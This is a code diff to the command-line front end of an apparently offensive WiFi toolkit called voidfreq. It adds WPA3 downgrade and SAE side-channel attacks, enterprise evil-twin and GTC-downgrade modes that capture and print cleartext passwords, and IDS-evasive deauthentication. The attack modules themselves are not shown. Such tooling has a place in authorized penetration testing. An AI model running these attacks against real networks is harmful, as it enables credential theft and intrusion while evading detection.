@@ -22,6 +22,7 @@ from .modules.analyzer import PcapAnalyzer
 from .modules.attack import AttackModule
 from .modules.captive import CaptivePortal
 from .modules.dnsspoof import DnsSpoofModule
+from .modules.enterprise import EnterpriseModule
 from .modules.eviltwin import EvilTwinConfig, EvilTwinModule
 from .modules.karma import KarmaConfig, KarmaModule
 from .modules.mitm import MitmModule
@@ -32,6 +33,7 @@ from .modules.proxy import ProxyModule
 from .modules.recon import ReconModule
 from .modules.scanner import ScannerModule
 from .modules.wordlist import WordlistConfig, WordlistGenerator
+from .modules.wpa3 import Wpa3Module
 from .modules.wps import WpsModule
 from .utils.deps import check_dependencies, check_root, doctor
 from .utils.report import generate_report
@@ -73,6 +75,11 @@ examples:
   voidfreq karma -ch 6 --captive                     # Karma with portal
   voidfreq osint -t AA:BB:CC:DD:EE:FF -e TestNet    # Passive OSINT
   voidfreq monitor --dashboard                       # Blue team monitor
+  voidfreq attack -t ... -ch 6 --wpa3-check --evasion # WPA3-aware + IDS evasion
+  voidfreq wpa3 detect -t AA:BB:CC:DD:EE:FF          # WPA3/SAE detection
+  voidfreq wpa3 downgrade -t AA:BB:CC:DD:EE:FF -ch 6 # Transition mode downgrade
+  voidfreq enterprise detect -t AA:BB:CC:DD:EE:FF    # EAP type detection
+  voidfreq enterprise wpe -e CorpWiFi -ch 6           # Enterprise evil twin
   voidfreq -v attack -t ... -ch 6 --pmf-check        # Verbose + PMF check
   voidfreq doctor                                    # System diagnostic
 """,
@@ -102,6 +109,10 @@ examples:
     attack.add_argument("--no-crack", action="store_true", help="Capture only, skip cracking")
     attack.add_argument("--pmf-check", action="store_true",
                         help="Check PMF before attack to auto-select strategy")
+    attack.add_argument("--wpa3-check", action="store_true",
+                        help="Check WPA3/SAE before attack to auto-select strategy")
+    attack.add_argument("--evasion", action="store_true",
+                        help="Use IDS-evasive deauth (randomized reasons, disassoc, rate limiting)")
     attack.add_argument("-o", "--output", default="./captures", help="Output directory")
 
     # scan (network scanner)
@@ -222,6 +233,52 @@ examples:
     pmf.add_argument("-t", "--target", required=True, help="Target AP BSSID")
     pmf.add_argument("-d", "--duration", type=int, default=30, help="Sniff duration (seconds)")
 
+    # wpa3
+    wpa3 = sub.add_parser("wpa3", help="WPA3/SAE attacks — detect, downgrade, timing, group")
+    wpa3_sub = wpa3.add_subparsers(dest="wpa3_action")
+
+    wpa3_detect = wpa3_sub.add_parser("detect", help="Detect WPA3/SAE capabilities")
+    wpa3_detect.add_argument("-t", "--target", required=True, help="Target AP BSSID")
+    wpa3_detect.add_argument("-d", "--duration", type=int, default=30, help="Sniff duration")
+
+    wpa3_downgrade = wpa3_sub.add_parser("downgrade", help="WPA3 transition mode downgrade")
+    wpa3_downgrade.add_argument("-t", "--target", required=True, help="Target AP BSSID")
+    wpa3_downgrade.add_argument("-ch", "--channel", type=int, required=True, help="Target channel")
+    wpa3_downgrade.add_argument("--client", help="Target client MAC")
+    wpa3_downgrade.add_argument("-o", "--output", default="./captures", help="Output directory")
+
+    wpa3_timing = wpa3_sub.add_parser("timing", help="SAE commit timing side-channel (CVE-2019-9494)")
+    wpa3_timing.add_argument("-t", "--target", required=True, help="Target AP BSSID")
+    wpa3_timing.add_argument("-ch", "--channel", type=int, required=True, help="Target channel")
+    wpa3_timing.add_argument("-d", "--duration", type=int, default=60, help="Capture duration")
+    wpa3_timing.add_argument("-o", "--output", default="./captures", help="Output directory")
+
+    wpa3_group = wpa3_sub.add_parser("group", help="SAE group downgrade test (CVE-2019-9496)")
+    wpa3_group.add_argument("-t", "--target", required=True, help="Target AP BSSID")
+    wpa3_group.add_argument("-ch", "--channel", type=int, required=True, help="Target channel")
+
+    # enterprise
+    ent = sub.add_parser("enterprise", help="802.1X Enterprise WiFi attacks")
+    ent_sub = ent.add_subparsers(dest="ent_action")
+
+    ent_detect = ent_sub.add_parser("detect", help="Detect EAP types on enterprise AP")
+    ent_detect.add_argument("-t", "--target", required=True, help="Target AP BSSID")
+    ent_detect.add_argument("-d", "--duration", type=int, default=30, help="Sniff duration")
+
+    ent_wpe = ent_sub.add_parser("wpe", help="Enterprise evil twin via hostapd-wpe")
+    ent_wpe.add_argument("-e", "--essid", required=True, help="SSID to impersonate")
+    ent_wpe.add_argument("-ch", "--channel", type=int, required=True, help="Channel")
+    ent_wpe.add_argument("--eap", choices=["PEAP", "EAP-TTLS", "GTC"], default="PEAP",
+                         help="EAP type to offer")
+    ent_wpe.add_argument("-d", "--duration", type=int, default=300, help="Capture duration")
+    ent_wpe.add_argument("-o", "--output", default="./captures", help="Output directory")
+
+    ent_gtc = ent_sub.add_parser("gtc", help="GTC downgrade — capture cleartext passwords")
+    ent_gtc.add_argument("-e", "--essid", required=True, help="SSID to impersonate")
+    ent_gtc.add_argument("-ch", "--channel", type=int, required=True, help="Channel")
+    ent_gtc.add_argument("-d", "--duration", type=int, default=300, help="Capture duration")
+    ent_gtc.add_argument("-o", "--output", default="./captures", help="Output directory")
+
     return parser
 
 
@@ -251,15 +308,24 @@ def cmd_attack(config: Config, args: argparse.Namespace) -> None:
 
     try:
         pmf_info = None
+        wpa3_info = None
+
         if args.pmf_check:
             console.print("[cyan]Running PMF pre-check...[/cyan]")
             pmf_info = detect_pmf(monitor_iface, args.target, duration=10)
+
+        if args.wpa3_check:
+            console.print("[cyan]Running WPA3/SAE pre-check...[/cyan]")
+            wpa3_mod = Wpa3Module(config, opsec)
+            wpa3_result = wpa3_mod.detect_wpa3(monitor_iface, args.target, duration=10)
+            wpa3_info = wpa3_mod.to_dict(wpa3_result)
 
         attack = AttackModule(config, opsec)
         capture = attack.capture(
             monitor_iface, args.target, args.channel,
             client_mac=args.client, output_dir=args.output,
-            pmf_info=pmf_info,
+            pmf_info=pmf_info, wpa3_info=wpa3_info,
+            evasion=args.evasion,
         )
 
         if capture.success and not args.no_crack:
@@ -731,6 +797,100 @@ def cmd_pmf(config: Config, args: argparse.Namespace) -> None:
         iface_mgr.disable_monitor_mode()
 
 
+def cmd_wpa3(config: Config, args: argparse.Namespace) -> None:
+    opsec = OpsecEngine(config)
+    iface_mgr = InterfaceManager(config.interface)
+
+    monitor_iface = iface_mgr.enable_monitor_mode()
+    if not monitor_iface:
+        return
+
+    try:
+        wpa3 = Wpa3Module(config, opsec)
+
+        if args.wpa3_action == "detect":
+            wpa3.detect_wpa3(monitor_iface, args.target, duration=args.duration)
+        elif args.wpa3_action == "downgrade":
+            result = wpa3.transition_downgrade(
+                monitor_iface, args.target, args.channel,
+                client_mac=getattr(args, "client", None),
+                output_dir=args.output,
+            )
+            if result.success:
+                console.print(f"\n[green bold]Downgrade capture: {result.capture_file}[/green bold]")
+            else:
+                console.print(f"\n[yellow]{result.message}[/yellow]")
+        elif args.wpa3_action == "timing":
+            result = wpa3.sae_timing_attack(
+                monitor_iface, args.target, args.channel,
+                duration=args.duration, output_dir=args.output,
+            )
+            if result.details:
+                console.print(f"[dim]Avg: {result.details.get('avg_response_ms', '?')}ms, "
+                              f"StdDev: {result.details.get('std_dev_ms', '?')}ms[/dim]")
+        elif args.wpa3_action == "group":
+            wpa3.sae_group_downgrade(
+                monitor_iface, args.target, args.channel,
+            )
+        else:
+            console.print("[yellow]Usage: voidfreq wpa3 {detect|downgrade|timing|group}[/yellow]")
+    finally:
+        iface_mgr.disable_monitor_mode()
+        opsec.cleanup()
+
+
+def cmd_enterprise(config: Config, args: argparse.Namespace) -> None:
+    opsec = OpsecEngine(config)
+    iface_mgr = InterfaceManager(config.interface)
+
+    if args.ent_action == "detect":
+        monitor_iface = iface_mgr.enable_monitor_mode()
+        if not monitor_iface:
+            return
+        try:
+            ent = EnterpriseModule(config, opsec)
+            ent.detect_eap(monitor_iface, args.target, duration=args.duration)
+        finally:
+            iface_mgr.disable_monitor_mode()
+            opsec.cleanup()
+
+    elif args.ent_action == "wpe":
+        try:
+            ent = EnterpriseModule(config, opsec)
+            result = ent.evil_twin_wpe(
+                config.interface, args.essid, args.channel,
+                eap_type=args.eap, duration=args.duration,
+                output_dir=args.output,
+            )
+            if result.success:
+                console.print(f"\n[green bold]Captured {len(result.credentials)} credential(s)[/green bold]")
+                for cred in result.credentials:
+                    console.print(f"  [green]{cred.get('username', '?')} — {cred.get('type', '?')}[/green]")
+            else:
+                console.print(f"\n[yellow]{result.message}[/yellow]")
+        finally:
+            opsec.cleanup()
+
+    elif args.ent_action == "gtc":
+        try:
+            ent = EnterpriseModule(config, opsec)
+            result = ent.gtc_downgrade(
+                config.interface, args.essid, args.channel,
+                duration=args.duration, output_dir=args.output,
+            )
+            if result.success:
+                console.print(f"\n[green bold]GTC cleartext capture: {len(result.credentials)} credential(s)[/green bold]")
+                for cred in result.credentials:
+                    console.print(f"  [green]{cred.get('username', '?')}: {cred.get('password', '?')}[/green]")
+            else:
+                console.print(f"\n[yellow]{result.message}[/yellow]")
+        finally:
+            opsec.cleanup()
+
+    else:
+        console.print("[yellow]Usage: voidfreq enterprise {detect|wpe|gtc}[/yellow]")
+
+
 def main() -> None:
     parser = build_parser()
     args = parser.parse_args()
@@ -777,6 +937,8 @@ def main() -> None:
         "karma": cmd_karma,
         "osint": cmd_osint,
         "pmf": cmd_pmf,
+        "wpa3": cmd_wpa3,
+        "enterprise": cmd_enterprise,
     }
 
     no_root_commands = ("check", "doctor", "opsec", "session", "wordlist", "analyze", "osint")
